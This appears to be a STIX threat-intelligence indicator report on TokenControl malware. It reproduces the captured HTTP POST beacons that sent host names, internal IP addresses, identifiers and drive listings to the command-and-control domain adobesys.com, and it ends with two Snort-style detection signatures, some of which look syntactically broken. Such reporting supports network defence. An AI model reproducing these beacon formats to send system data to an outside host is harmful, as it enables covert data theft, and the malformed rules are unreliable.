stix:STIX_Header.stix:Title: Command and Control Sites Associated with TokenControl Malware
stix:STIX_Header.stix:Description:
TokenControl malware was installed on three compromised hosts on 7 January 2015 between 03:23 to 03:48 GMT and 10:28 to 11:35 GMT, then again on 8 January 2015 between 01:52 to 08:58 GMT. The TokenControl malware communicated with the domain adobesys.com, which was identified as a TokenControl command and control (C2) site in the US. The malware sent HTTP POST requests that contained survey information or system drive information about the compromised host.
TokenControl malware was discussed previously in IB-14-10502.

stix:Indicator.indicator:Description:
The TokenControl malware sent the following POST requests to this site:
POST /result?174536523 HTTP/1.1 Host: adobesys.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/50559 Firefox/3.0.1 Pragma: no-cache Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080 Cache-Control: max-age=259200 Max-Forwards: 10 Connection: Keep-Alive Content-Length: 112 computer=BED7429 [[REDACTED USERNAME]]&lanip=172.29.43.165&uid=732280440b9fee2533408e32abaf53d3&os=6,1,32&relay=2&data=
POST /result?3098933075 HTTP/1.1 Host: adobesys.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/3088222327 Firefox/3.0.1 Pragma: no-cache Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080 Cache-Control: max-age=259200 Max-Forwards: 10 Connection: Keep-Alive Content-Length: 106 computer=DUV4193 [[REDACTED USERNAME]]&lanip=172.29.48.209&uid=e3e49481d4616722de295af48a5c7b5c&os=6,1,32&relay=2&data=
POST /result?30644571 HTTP/1.1 Host: adobesys.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/17277703 Firefox/3.0.1 Pragma: no-cache Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080 Cache-Control: max-age=259200 Max-Forwards: 10 Connection: Keep-Alive Content-Length: 104 computer=BED7362 [[REDACTED USERNAME]]&lanip=10.226.36.10&uid=732280440b9fee2533408e32abaf53d3&os=6,1,32&relay=2&data=

The TokenControl malware sent the following POST request to this site:
POST /drive HTTP/1.1 Host: adobesys.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/17277703 Firefox/3.0.1 Pragma: no-cache Via: 1.1 du2prox1 (squid/3.1.10), 1.1 [REDACTED DOMAIN]:8080 Cache-Control: max-age=259200 Max-Forwards: 10 Connection: Keep-Alive Content-Length: 28 A:\|C:\|D:\|M:\|R:\|T:\|Z:\|
The signatures below were written to detect traffic without SSL encryption. Additionally, creating a signature on the private key could help track and decrypt SSL traffic from this malware.
Alert tcp any any <> any any (msg:"TokenControl:RESULT_POST_HOST_INFO_BCN"; sid:124; content: "POST"; http_method; content:"/result?"; http_url; content:"computer=";content:"&lanip="; distance:1; content:"&uid="; distance:1; content:"&relay="; distance:33;content:"&data=;distance:1; pcre:"/\/result\?\d{7}/U";)
Alert tcp any any -> any [80,8080] (msg:TokenControl_Implant_UA"; content:"User-Agent: HttpBrowser/1.0"; sid 10143281;)
